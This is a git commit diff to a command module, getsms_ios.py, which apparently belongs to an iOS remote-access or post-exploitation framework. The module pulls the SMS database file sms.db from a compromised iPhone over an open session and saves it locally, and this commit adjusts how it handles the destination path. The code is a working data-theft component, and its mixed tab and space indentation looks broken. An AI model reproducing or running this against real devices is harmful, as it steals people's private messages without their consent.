e71e9d4b995d8622668e9afd965d8f3216439749
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-04-26 22:21:46 +0300

    Update getsms_ios.py

--- core/commands/ios/getsms_ios.py
+++ core/commands/ios/getsms_ios.py
@@ -53,20 +53,33 @@ class command:
                         h.info_error("Local directory: "+dest+": does not exist!")
                 else:
                     rp = os.path.split(dest)[0]
-                    if os.path.exists(rp):
-			if os.path.isdir(rp):
-			    pr = os.path.split(dest)[0]
-                            rp = os.path.split(dest)[1]
-                            h.info_general("Getting SMS...")
-			    data = session.download_file('/var/mobile/Library/SMS/sms.db')
-			    if data:
-			        f = open(os.path.join(pr,rp),'w')
-			        f.write(data)
-			        f.close()
-                            h.info_general("Saving to "+dest+"...")
-                            time.sleep(1)
-                            h.info_success("Saved to "+dest+"!")
+		    if rp != "":
+                        if os.path.exists(rp):
+			    if os.path.isdir(rp):
+			        pr = os.path.split(dest)[0]
+                                rp = os.path.split(dest)[1]
+                                h.info_general("Getting SMS...")
+			        data = session.download_file('/var/mobile/Library/SMS/sms.db')
+			        if data:
+			            f = open(os.path.join(pr,rp),'w')
+			            f.write(data)
+			            f.close()
+                                h.info_general("Saving to "+dest+"...")
+                                time.sleep(1)
+                                h.info_success("Saved to "+dest+"!")
+                            else:
+                                h.info_error("Error: "+rp+": not a directory!")
                         else:
-                            h.info_error("Error: "+rp+": not a directory!")
-                    else:
-                        h.info_error("Local directory: "+rp+": does not exist!")
+                            h.info_error("Local directory: "+rp+": does not exist!")
+		    else:
+			pr = os.path.split(dest)[0]
+                        rp = os.path.split(dest)[1]
+                        h.info_general("Getting SMS...")
+		        data = session.download_file('/var/mobile/Library/SMS/sms.db')
+		        if data:
+		            f = open(os.path.join(pr,rp),'w')
+		            f.write(data)
+		            f.close()
+                        h.info_general("Saving to "+dest+"...")
+                        time.sleep(1)
+                        h.info_success("Saved to "+dest+"!")
